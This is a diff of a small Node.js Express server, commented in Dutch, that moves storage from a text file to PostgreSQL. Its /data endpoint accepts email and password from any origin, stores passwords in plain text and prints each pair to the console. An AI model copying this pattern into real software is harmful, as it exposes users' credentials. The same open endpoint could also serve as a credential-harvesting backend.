@@ -1,8 +1,7 @@
 const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
-const fs = require("fs");
-const path = require("path");
+const { Pool } = require("pg");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -10,27 +9,42 @@ const PORT = process.env.PORT || 3000;
 app.use(cors());
 app.use(bodyParser.json());
 
-// Pad naar bestand
-const filePath = path.join(__dirname, "data.txt"); // plain text bestand
+// PostgreSQL pool gebruiken met environment variables
+const pool = new Pool({
+  user: process.env.DB_USER,
+  host: process.env.DB_HOST,
+  database: process.env.DB_NAME,
+  password: process.env.DB_PASSWORD,
+  port: process.env.DB_PORT,
+});
 
-// Zorg dat het bestand bestaat
-if (!fs.existsSync(filePath)) {
-  fs.writeFileSync(filePath, "");
-}
+// Zorg dat de tabel bestaat (1 keer run)
+pool.query(`
+CREATE TABLE IF NOT EXISTS users (
+  id SERIAL PRIMARY KEY,
+  email TEXT,
+  password TEXT,
+  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+)`);
 
-app.post("/data", (req, res) => {
+app.post("/data", async (req, res) => {
   const { email, password } = req.body;
 
-  // Format string
-  const entry = `Email: ${email}\nWachtwoord: ${password}\n---\n`;
+  try {
+    // Voeg data toe aan database
+    await pool.query(
+      "INSERT INTO users (email, password) VALUES ($1, $2)",
+      [email, password]
+    );
 
-  // Log naar console
-  console.log(entry);
+    // Log in console in jouw gewenste format
+    console.log(`Email: ${email}\nWachtwoord: ${password}\n---`);
 
-  // Append naar bestand
-  fs.appendFileSync(filePath, entry);
-
-  res.json({ message: "Data ontvangen en opgeslagen!" });
+    res.json({ message: "Data opgeslagen in database!" });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: "Fout bij opslaan" });
+  }
 });
 
 app.listen(PORT, () => {
